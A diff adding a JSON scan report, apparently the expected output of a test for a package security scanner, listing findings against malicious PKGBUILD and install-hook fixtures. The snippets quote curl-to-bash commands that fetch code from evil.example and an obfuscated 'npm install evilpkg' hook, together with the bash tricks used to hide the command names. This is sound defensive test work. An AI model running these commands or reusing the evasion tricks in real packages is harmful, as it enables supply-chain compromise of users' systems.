@@ -1,0 +1,322 @@
+{
+  "package_name": "resolver-operators",
+  "package_version": "1.0-1",
+  "findings": [
+    {
+      "id": "DLE-001",
+      "severity": "critical",
+      "category": "command_injection",
+      "title": "Curl pipe to shell",
+      "description": "Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.",
+      "location": {
+        "file": "tests/fixtures/malicious/resolver-operators/PKGBUILD",
+        "line": 13,
+        "column": 5,
+        "snippet": "    ${c:1:4} -fsSL https://evil.example/stage1 | bash    [resolved →     curl -fsSL https://evil.example/stage1 | bash]"
+      },
+      "recommendation": "Download scripts first, review them, then execute",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "matched_text": "curl -fsSL https://evil.example/stage1 | bash"
+      }
+    },
+    {
+      "id": "DLE-001",
+      "severity": "critical",
+      "category": "command_injection",
+      "title": "Curl pipe to shell",
+      "description": "Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.",
+      "location": {
+        "file": "tests/fixtures/malicious/resolver-operators/PKGBUILD",
+        "line": 17,
+        "column": 11,
+        "snippet": "    f() { \"$1\" -fsSL https://evil.example/stage2 | bash; }; f curl    [resolved →     f() { curl -fsSL https://evil.example/stage2 | bash; }; f curl]"
+      },
+      "recommendation": "Download scripts first, review them, then execute",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "matched_text": "curl -fsSL https://evil.example/stage2 | bash"
+      }
+    },
+    {
+      "id": "DLE-001",
+      "severity": "critical",
+      "category": "command_injection",
+      "title": "Curl pipe to shell",
+      "description": "Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.",
+      "location": {
+        "file": "tests/fixtures/malicious/resolver-operators/PKGBUILD",
+        "line": 23,
+        "column": 5,
+        "snippet": "    $_f -fsSL https://evil.example/stage3 | $_s    [resolved →     curl -fsSL https://evil.example/stage3 | bash]"
+      },
+      "recommendation": "Download scripts first, review them, then execute",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "matched_text": "curl -fsSL https://evil.example/stage3 | bash"
+      }
+    },
+    {
+      "id": "ATOMIC-002",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Node/Bun package manager in install hook (install script)",
+      "description": "Invokes npm/pnpm/yarn/bun (or the npx/bunx runners) to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm rebuild`, `npm exec`, `pnpm dlx`, `yarn dlx`, and the bare `npx <pkg>` / `bunx <pkg>` runners all fetch-and-run lifecycle/remote code just like `install`.",
+      "location": {
+        "file": "tests/fixtures/malicious/resolver-operators/resolver-operators.install",
+        "line": 2,
+        "column": 14,
+        "snippet": "    v=nZpZm; ${v//Z/} install evilpkg    [resolved →     v=nZpZm; npm install evilpkg]"
+      },
+      "recommendation": "Install scripts must never fetch or install npm/bun packages. Inspect the PKGBUILD diff and report the package to the AUR maintainers.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "npm install",
+        "script_kind": "install script"
+      }
+    },
+    {
+      "id": "ATOMIC-002",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Node/Bun package manager in install hook (install script)",
+      "description": "Invokes npm/pnpm/yarn/bun (or the npx/bunx runners) to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm rebuild`, `npm exec`, `pnpm dlx`, `yarn dlx`, and the bare `npx <pkg>` / `bunx <pkg>` runners all fetch-and-run lifecycle/remote code just like `install`.",
+      "location": {
+        "file": "tests/fixtures/malicious/resolver-operators/resolver-operators.install",
+        "line": 4,
+        "column": 5,
+        "snippet": "    zz install evilpkg    [resolved →     npm install evilpkg]"
+      },
+      "recommendation": "Install scripts must never fetch or install npm/bun packages. Inspect the PKGBUILD diff and report the package to the AUR maintainers.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "npm install",
+        "script_kind": "install script"
+      }
+    },
+    {
+      "id": "ATOMIC-002",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Node/Bun package manager in install hook (install script)",
+      "description": "Invokes npm/pnpm/yarn/bun (or the npx/bunx runners) to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm rebuild`, `npm exec`, `pnpm dlx`, `yarn dlx`, and the bare `npx <pkg>` / `bunx <pkg>` runners all fetch-and-run lifecycle/remote code just like `install`.",
+      "location": {
+        "file": "tests/fixtures/malicious/resolver-operators/resolver-operators.install",
+        "line": 5,
+        "column": 5,
+        "snippet": "    n$()pm install evilpkg    [de-obfuscated →     npm install evilpkg]"
+      },
+      "recommendation": "Install scripts must never fetch or install npm/bun packages. Inspect the PKGBUILD diff and report the package to the AUR maintainers.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "npm install",
+        "script_kind": "install script"
+      }
+    },
+    {
+      "id": "ATOMIC-002",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Node/Bun package manager in install hook (install script)",
+      "description": "Invokes npm/pnpm/yarn/bun (or the npx/bunx runners) to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm rebuild`, `npm exec`, `pnpm dlx`, `yarn dlx`, and the bare `npx <pkg>` / `bunx <pkg>` runners all fetch-and-run lifecycle/remote code just like `install`.",
+      "location": {
+        "file": "tests/fixtures/malicious/resolver-operators/resolver-operators.install",
+        "line": 6,
+        "column": 5,
+        "snippet": "    $\"n\"$\"pm\" install evilpkg    [de-obfuscated →     npm install evilpkg]"
+      },
+      "recommendation": "Install scripts must never fetch or install npm/bun packages. Inspect the PKGBUILD diff and report the package to the AUR maintainers.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "npm install",
+        "script_kind": "install script"
+      }
+    },
+    {
+      "id": "EXEC-REMOTE",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Fetches and runs code from https://evil.example/stage1",
+      "description": "This package downloads and executes code from https://evil.example/stage1 at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.",
+      "location": {
+        "file": "tests/fixtures/malicious/resolver-operators/PKGBUILD",
+        "line": 13,
+        "column": null,
+        "snippet": "curl -fsSL https://evil.example/stage1 | bash"
+      },
+      "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "flow": "fetch-pipe",
+        "opaque_boundary": true,
+        "remote_urls": [
+          "https://evil.example/stage1"
+        ]
+      }
+    },
+    {
+      "id": "EXEC-REMOTE",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Fetches and runs code from https://evil.example/stage2",
+      "description": "This package downloads and executes code from https://evil.example/stage2 at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.",
+      "location": {
+        "file": "tests/fixtures/malicious/resolver-operators/PKGBUILD",
+        "line": 17,
+        "column": null,
+        "snippet": "f() { curl -fsSL https://evil.example/stage2 | bash; }; f curl"
+      },
+      "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "flow": "fetch-pipe",
+        "opaque_boundary": true,
+        "remote_urls": [
+          "https://evil.example/stage2"
+        ]
+      }
+    },
+    {
+      "id": "EXEC-REMOTE",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Fetches and runs code from https://evil.example/stage3",
+      "description": "This package downloads and executes code from https://evil.example/stage3 at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.",
+      "location": {
+        "file": "tests/fixtures/malicious/resolver-operators/PKGBUILD",
+        "line": 23,
+        "column": null,
+        "snippet": "curl -fsSL https://evil.example/stage3 | bash"
+      },
+      "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "flow": "fetch-pipe",
+        "opaque_boundary": true,
+        "remote_urls": [
+          "https://evil.example/stage3"
+        ]
+      }
+    },
+    {
+      "id": "OBF-020",
+      "severity": "high",
+      "category": "obfuscation",
+      "title": "Dynamic command name",
+      "description": "The command word is an expansion the scanner cannot resolve (${x:1:3}, ${x//a/b}, ${x#p}, ${a[1]}, $(echo ... | tr ...), \"$1\") on a line that fetches a URL into a shell, or in front of a package-manager verb (install, add, i). Hiding the command name this way is how a payload dodges name-based rules; ordinary build lines such as ${CC:-gcc} or \"${CMAKE[@]}\" are not matched.",
+      "location": {
+        "file": "tests/fixtures/malicious/resolver-operators/PKGBUILD",
+        "line": 13,
+        "column": 1,
+        "snippet": "    ${c:1:4} -fsSL https://evil.example/stage1 | bash"
+      },
+      "recommendation": "Review the line; the command being run is assembled at run time to avoid matching.",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "matched_text": "    ${c:1:4} -fsSL https://evil.example/stage1 | bash"
+      }
+    },
+    {
+      "id": "OBF-020",
+      "severity": "high",
+      "category": "obfuscation",
+      "title": "Dynamic command name",
+      "description": "The command word is an expansion the scanner cannot resolve (${x:1:3}, ${x//a/b}, ${x#p}, ${a[1]}, $(echo ... | tr ...), \"$1\") on a line that fetches a URL into a shell, or in front of a package-manager verb (install, add, i). Hiding the command name this way is how a payload dodges name-based rules; ordinary build lines such as ${CC:-gcc} or \"${CMAKE[@]}\" are not matched.",
+      "location": {
+        "file": "tests/fixtures/malicious/resolver-operators/PKGBUILD",
+        "line": 17,
+        "column": 9,
+        "snippet": "    f() { \"$1\" -fsSL https://evil.example/stage2 | bash; }; f curl"
+      },
+      "recommendation": "Review the line; the command being run is assembled at run time to avoid matching.",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "matched_text": "{ \"$1\" -fsSL https://evil.example/stage2 | bash"
+      }
+    },
+    {
+      "id": "OBF-020",
+      "severity": "high",
+      "category": "obfuscation",
+      "title": "Dynamic command name (install script)",
+      "description": "The command word is an expansion the scanner cannot resolve (${x:1:3}, ${x//a/b}, ${x#p}, ${a[1]}, $(echo ... | tr ...), \"$1\") on a line that fetches a URL into a shell, or in front of a package-manager verb (install, add, i). Hiding the command name this way is how a payload dodges name-based rules; ordinary build lines such as ${CC:-gcc} or \"${CMAKE[@]}\" are not matched.",
+      "location": {
+        "file": "tests/fixtures/malicious/resolver-operators/resolver-operators.install",
+        "line": 2,
+        "column": 12,
+        "snippet": "    v=nZpZm; ${v//Z/} install evilpkg"
+      },
+      "recommendation": "Review the line; the command being run is assembled at run time to avoid matching.",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "; ${v//Z/} install",
+        "script_kind": "install script"
+      }
+    },
+    {
+      "id": "FUNC-001",
+      "severity": "high",
+      "category": "network_security",
+      "title": "Network access in build function",
+      "description": "Function 'build' contains network access command 'curl'",
+      "location": {
+        "file": "tests/fixtures/malicious/resolver-operators/PKGBUILD",
+        "line": 16,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Network access should happen in source= array, not build functions",
+      "cwe_id": null,
+      "metadata": {
+        "function": "build",
+        "pattern": "curl"
+      }
+    },
+    {
+      "id": "FUNC-001",
+      "severity": "high",
+      "category": "network_security",
+      "title": "Network access in build function",
+      "description": "Function 'package' contains network access command 'curl'",
+      "location": {
+        "file": "tests/fixtures/malicious/resolver-operators/PKGBUILD",
+        "line": 20,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Network access should happen in source= array, not build functions",
+      "cwe_id": null,
+      "metadata": {
+        "function": "package",
+        "pattern": "curl"
+      }
+    },
+    {
+      "id": "SRC-005",
+      "severity": "medium",
+      "category": "configuration",
+      "title": "No sources with build function",
+      "description": "Package has build() function but no source array",
+      "location": {
+        "file": "tests/fixtures/malicious/resolver-operators/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Verify this is intentional; build() usually needs sources",
+      "cwe_id": null,
+      "metadata": {}
+    }
+  ],
+  "scanned_files": [
+    "tests/fixtures/malicious/resolver-operators/PKGBUILD",
+    "tests/fixtures/malicious/resolver-operators/resolver-operators.install"
+  ],
+  "timestamp": "2026-11-10T14:51:06.488731695Z",
+  "scan_duration_ms": 23
+}
